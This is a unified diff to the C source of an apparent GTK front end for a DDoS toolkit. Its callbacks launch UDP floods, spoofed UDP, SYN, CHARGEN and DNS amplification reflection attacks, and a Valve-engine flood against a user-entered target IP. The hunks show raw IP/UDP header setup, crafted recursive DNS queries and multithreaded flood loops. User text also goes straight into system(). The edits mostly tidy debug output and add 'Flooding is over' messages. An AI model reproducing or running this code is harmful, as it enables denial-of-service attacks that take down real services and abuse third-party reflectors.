@@ -52,24 +52,17 @@ void cb_udp_ddos_script_1(GtkButton *button, gpointer user_data)
     GtkWidget *run_script_dialog = NULL;
     GtkWidget *script_command_entry = NULL;
     //const gchar *script_command = NULL;
-    gchar *logs_msg = NULL;
 
     GtkTextBuffer *text_buffer = NULL;
     gchar *text = NULL;
     GtkTextIter start;
     GtkTextIter end;
 
-    //size_t i = 0;
-
-    logs_msg = malloc(128 * sizeof(char));
-    if(logs_msg == NULL)
-        error("malloc() logs_msg", "cb_udp_ddos_script_1()");
-
     /* Obtaining the buffer associated with the widget. */
     text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ddos_text_view));
 
     /** Set the default buffer text. **/
-    gtk_text_buffer_set_text(text_buffer, "usage: python ddos.py -u ip port time", -1);
+    gtk_text_buffer_set_text(text_buffer, "usage: python ddos.py -u <ip> <port> <time>", -1);
 
     /** Obtain iters for the start and end of points of the buffer **/
     gtk_text_buffer_get_start_iter(text_buffer, &start);
@@ -81,7 +74,7 @@ void cb_udp_ddos_script_1(GtkButton *button, gpointer user_data)
     /** Print the text **/
     g_print("%s", text);
 
-    g_free(text);
+    //g_free(text);
 
     run_script_dialog = gtk_dialog_new_with_buttons("Run UDP Basic Attack 1", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
 
@@ -94,11 +87,10 @@ void cb_udp_ddos_script_1(GtkButton *button, gpointer user_data)
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(run_script_dialog)->vbox), script_command_entry, TRUE, FALSE, 0);
 
     gtk_widget_show_all(GTK_DIALOG(run_script_dialog)->vbox);
-
-
     switch(gtk_dialog_run(GTK_DIALOG(run_script_dialog)))
     {
         case GTK_RESPONSE_APPLY:
+
             script_command = gtk_entry_get_text(GTK_ENTRY(script_command_entry));
             system(script_command);
             gtk_widget_destroy(run_script_dialog);
@@ -106,8 +98,12 @@ void cb_udp_ddos_script_1(GtkButton *button, gpointer user_data)
 
         default:
             gtk_widget_destroy(run_script_dialog);
-            break;
+            return;
     }
+
+    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
+    g_print("%s", text);
+    g_free(text);
 
     /* Unused parameter */
     (void)button;
@@ -122,22 +118,17 @@ void cb_udp_ddos_script_2(GtkButton *button, gpointer user_data)
     GtkWidget *run_script_dialog = NULL;
     GtkWidget *script_command_entry = NULL;
     //const gchar *script_command = NULL;
-    gchar *logs_msg = NULL;             // ????????? SERT A QUOI ?????????
 
     GtkTextBuffer *text_buffer = NULL;
     gchar *text = NULL;
     GtkTextIter start;
     GtkTextIter end;
 
-    logs_msg = malloc(128 * sizeof(char));
-    if(logs_msg == NULL)
-        error("malloc() logs_msg", "cb_udp_ddos_script_2()");
-
     /* Obtaining the buffer associated with the widget. */
     text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ddos_text_view));
 
     /** Set the default buffer text. **/
-    gtk_text_buffer_set_text(text_buffer, "Usage: sudo ./udp_basic.py -u ip port time", -1);
+    gtk_text_buffer_set_text(text_buffer, "Usage: sudo ./udp_basic.py -u <ip> <port> <time>", -1);
 
     /** Obtain iters for the start and end of points of the buffer **/
     gtk_text_buffer_get_start_iter(text_buffer, &start);
@@ -149,7 +140,7 @@ void cb_udp_ddos_script_2(GtkButton *button, gpointer user_data)
     /** Print the text **/
     g_print("%s", text);
 
-    g_free(text);
+    //g_free(text);
 
     run_script_dialog = gtk_dialog_new_with_buttons("Run UDP Basic Attack 2", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
 
@@ -162,7 +153,6 @@ void cb_udp_ddos_script_2(GtkButton *button, gpointer user_data)
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(run_script_dialog)->vbox), script_command_entry, TRUE, FALSE, 0);
 
     gtk_widget_show_all(GTK_DIALOG(run_script_dialog)->vbox);
-
     switch(gtk_dialog_run(GTK_DIALOG(run_script_dialog)))
     {
         case GTK_RESPONSE_APPLY:
@@ -173,8 +163,12 @@ void cb_udp_ddos_script_2(GtkButton *button, gpointer user_data)
 
         default:
             gtk_widget_destroy(run_script_dialog);
-            break;
+            return;
     }
+
+    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
+    g_print("%s", text);
+    g_free(text);
 
     /* Unused Parameters */
     (void)button;
@@ -230,7 +224,7 @@ void cb_udp_power_ddos(void)
     /** Print the text **/
     g_print("%s", text);
 
-    g_free(text);
+    //g_free(text);
 
     IP_dialog = gtk_dialog_new_with_buttons("Enter Target IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     port_dialog = gtk_dialog_new_with_buttons("Enter Target Port", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
@@ -343,15 +337,6 @@ void cb_udp_power_ddos(void)
             return;
     }
 
-    printf("IP = %s\n", IP);
-    printf("port = %s\n", port_number);
-    printf("throttle = %s\n", throttle);
-    printf("packet_size = %s\n", packet);
-    printf("num_threads = %s\n", number_threads);
-    printf("time = %s\n", time_duration);
-
-    fprintf(stdout, "Setting up Sockets...\n");
-
     int num_threads = atoi(number_threads);
     int packet_size = atoi(packet);
     unsigned int floodport_power = atoi(port_number);
@@ -377,8 +362,6 @@ void cb_udp_power_ddos(void)
         pthread_create(&thread[i], NULL, &flood_power, (void *) &td[i]);
     }
 
-    fprintf(stdout, "Starting Flood...\n");
-
     wait_time_end(atoi(time_duration));
 
     gtk_widget_destroy(IP_dialog);
@@ -390,6 +373,10 @@ void cb_udp_power_ddos(void)
 
     for(i = 0; i < num_threads; i++)
         pthread_cancel(thread[i]);
+
+    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
+    g_print("%s", text);
+    g_free(text);
 
     return;
 }
@@ -541,14 +528,12 @@ void *flood_power(void *par1)
     //unsigned int floodport = td->floodport;
     floodport = td->floodport;
 
-    // Clear the data
     memset(datagram, 0, MAX_PACKET_SIZE);
 
-    // Set appropriate fields in headers
     setup_ip_header_power(iph);
     setup_udp_header_power(udph);
 
-    //char *data = (char *)udph + sizeof(struct udphdr);    /** ATTENTION A CETTE MISE EN COMMENTAIRE     **/
+    //char *data = (char *)udph + sizeof(struct udphdr);    /** ATTENTION uncoment si necessaire     **/
     //data = replStr("\xFF", td->pks);
     udph->len = htons(td->pks);
 
@@ -802,7 +787,7 @@ void cb_essyn_attack(void)
     /** Print the text **/
     g_print("%s", text);
 
-    g_free(text);
+    //g_free(text);
 
     IP_dialog = gtk_dialog_new_with_buttons("Enter Target IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     Your_IP_dialog = gtk_dialog_new_with_buttons("Enter Your IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
@@ -897,14 +882,6 @@ void cb_essyn_attack(void)
             return;
     }
 
-    /*
-    printf("IP = %s\n", IP);
-    printf("port = %s\n", port_number);
-    printf("threads = %s\n", number_of_threads);
-    printf("pps = %s\n", pps_number);
-    printf("time = %s\n", time_duration);
-    */
-
     int num_threads = atoi(number_of_threads);
     floodport = atoi(port_number);
 
@@ -926,6 +903,10 @@ void cb_essyn_attack(void)
 
     for(i = 0; i < num_threads; i++)
         pthread_cancel(thread[i]);
+
+    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
+    g_print("%s", text);
+    g_free(text);
 
     return;
 }
@@ -1061,7 +1042,7 @@ void cb_chargen_ddos(void)
     /** Print the text **/
     g_print("%s", text);
 
-    g_free(text);
+    //g_free(text);
 
     IP_dialog = gtk_dialog_new_with_buttons("Enter Your IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     port_dialog = gtk_dialog_new_with_buttons("Enter Target Port", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
@@ -1155,14 +1136,6 @@ void cb_chargen_ddos(void)
             gtk_widget_destroy(time_dialog);
             return;
     }
-
-    /*
-    printf("IP = %s\n", IP);
-    printf("port = %s\n", port_number);
-    printf("reflection = %s\n", reflection);
-    printf("throttle = %s\n", throttle);
-    printf("time = %s\n", time_duration);
-    */
 
     int i = 0;
     head = NULL;
@@ -1238,6 +1211,10 @@ void cb_chargen_ddos(void)
     for(i = 0; i < num_threads; i++)
         pthread_cancel(thread[i]);
 
+    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
+    g_print("%s", text);
+    g_free(text);
+
     return;
 }
 
@@ -1285,7 +1262,7 @@ void cb_dns_amped_ddos(void)
     /** Print the text **/
     g_print("%s", text);
 
-    g_free(text);
+    //g_free(text);
 
     IP_dialog = gtk_dialog_new_with_buttons("Enter Your IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     port_dialog = gtk_dialog_new_with_buttons("Enter Target Port", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
@@ -1380,12 +1357,6 @@ void cb_dns_amped_ddos(void)
             return;
     }
 
-    printf("IP = %s\n", IP);
-    printf("port = %s\n", port_number);
-    printf("reflection = %s\n", reflection);
-    printf("throttle = %s\n", throttle);
-    printf("time = %s\n", time_duration);
-
     head = NULL;
 
     char *strLine = (char *) malloc(256);
@@ -1438,6 +1409,10 @@ void cb_dns_amped_ddos(void)
 
     for(i = 0; i < num_threads; i++)
         pthread_cancel(thread[i]);
+
+    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
+    g_print("%s", text);
+    g_free(text);
 
     return;
 
@@ -1547,17 +1522,17 @@ void *flood_dns(void *par1)
 
     struct DNS_HEADER *dns  = (struct DNS_HEADER *) &strPacket[iPayloadSize];
     dns->id = (unsigned short) htons(rand_cmwc_dns());
-    dns->qr = 0; //This is a query
-    dns->opcode = 0; //This is a standard query
-    dns->aa = 0; //Not Authoritative
-    dns->tc = 0; //This message is not truncated
-    dns->rd = 1; //Recursion Desired
-    dns->ra = 0; //Recursion not available! hey we dont have it (lol)
+    dns->qr = 0;
+    dns->opcode = 0;
+    dns->aa = 0;
+    dns->tc = 0;
+    dns->rd = 1;
+    dns->ra = 0;
     dns->z = 0;
     dns->ad = 0;
     dns->cd = 0;
     dns->rcode = 0;
-    dns->q_count = htons(1); //we have only 1 question
+    dns->q_count = htons(1);
     dns->ans_count = 0;
     dns->auth_count = 0;
     dns->add_count = htons(1);
@@ -1585,7 +1560,7 @@ void *flood_dns(void *par1)
         unsigned char *qname = (unsigned char*) &strPacket[iPayloadSize + iAdditionalSize];
 
         strcpy((char*)strDomain, list_node->domain);
-        ChangetoDnsNameFormat(qname, strDomain);            /*** IIIIIIIIIIIICIIIIIIII ***/
+        ChangetoDnsNameFormat(qname, strDomain);
 
         iAdditionalSize += strlen(qname) + 1;
 
@@ -1715,7 +1690,7 @@ void cb_udp_spoofed(void)
     /** Print the text **/
     g_print("%s", text);
 
-    g_free(text);
+    //g_free(text);
 
     IP_dialog = gtk_dialog_new_with_buttons("Enter Target IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     port_dialog = gtk_dialog_new_with_buttons("Enter Target Port", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
@@ -1810,12 +1785,6 @@ void cb_udp_spoofed(void)
             return;
     }
 
-    printf("IP = %s\n", IP);
-    printf("port = %s\n", port_number_spoof);
-    printf("IP file name = %s\n", ip_file);
-    printf("time = %s\n", time_duration);
-    printf("mesage = %s\n", message);
-
     struct file_list *list = NULL;
 	int list_size = 0;
 
@@ -1865,6 +1834,10 @@ void cb_udp_spoofed(void)
 	wait_time_end(atoi(time_duration));
 
     pthread_cancel(udp_attack);
+
+    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
+    g_print("%s", text);
+    g_free(text);
 
 	return;
 }
@@ -1999,21 +1972,16 @@ void cb_valve_engine_ddos(GtkButton *button, gpointer user_data)
     /** Print the text **/
     g_print("%s", text);
 
-    g_free(text);
+    //g_free(text);
 
 
     IP_dialog = gtk_dialog_new_with_buttons("Enter Target IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     Your_IP_dialog = gtk_dialog_new_with_buttons("Enter Your IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
-    //port_dialog = gtk_dialog_new_with_buttons("Enter Target Port", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
-    //throttle_dialog = gtk_dialog_new_with_buttons("Enter Throttle", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
-    //packet_dialog = gtk_dialog_new_with_buttons("Enter Packet Size(max 1024)", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     threads_dialog = gtk_dialog_new_with_buttons("Enter Threads Number", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     time_dialog = gtk_dialog_new_with_buttons("Enter Time", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
 
     gtk_widget_set_size_request(IP_dialog, 360, 100);
     gtk_widget_set_size_request(Your_IP_dialog, 360, 100);
-    //gtk_widget_set_size_request(throttle_dialog, 360, 100);
-    //gtk_widget_set_size_request(packet_dialog, 360, 100);
     gtk_widget_set_size_request(threads_dialog, 360, 100);
     gtk_widget_set_size_request(time_dialog, 360, 100);
 
@@ -2021,13 +1989,9 @@ void cb_valve_engine_ddos(GtkButton *button, gpointer user_data)
     get_arg_entry_2 = gtk_entry_new();
     get_arg_entry_3 = gtk_entry_new();
     get_arg_entry_4 = gtk_entry_new();
-    //get_arg_entry_5 = gtk_entry_new();
-    //get_arg_entry_6 = gtk_entry_new();
 
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), get_arg_entry_1, TRUE, FALSE, 0);
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(Your_IP_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
-    //gtk_box_pack_start(GTK_BOX(GTK_DIALOG(throttle_dialog)->vbox), get_arg_entry_3, TRUE, FALSE, 0);
-    //gtk_box_pack_start(GTK_BOX(GTK_DIALOG(packet_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(threads_dialog)->vbox), get_arg_entry_2, TRUE, FALSE, 0);
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_dialog)->vbox), get_arg_entry_3, TRUE, FALSE, 0);
 
@@ -2081,20 +2045,10 @@ void cb_valve_engine_ddos(GtkButton *button, gpointer user_data)
         default:
             gtk_widget_destroy(IP_dialog);
             gtk_widget_destroy(Your_IP_dialog);
-            //gtk_widget_destroy(port_dialog);
-            //gtk_widget_destroy(throttle_dialog);
-            //gtk_widget_destroy(packet_dialog);
             gtk_widget_destroy(threads_dialog);
             gtk_widget_destroy(time_dialog);
             return;
     }
-
-    printf("IP = %s\n", IP);
-    //printf("port = %s\n", port_number);
-    //printf("throttle = %s\n", throttle);
-    //printf("packet_size = %s\n", packet);
-    printf("num_threads = %s\n", number_threads);
-    printf("time = %s\n", time_duration);
 
     fprintf(stdout, "Setting up Sockets...\n");
 
@@ -2117,6 +2071,10 @@ void cb_valve_engine_ddos(GtkButton *button, gpointer user_data)
 
     for(i = 0; i < num_threads; i++)
         pthread_cancel(thread[i]);
+
+    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
+    g_print("%s", text);
+    g_free(text);
 
     /* unused parameters */
     (void)button;
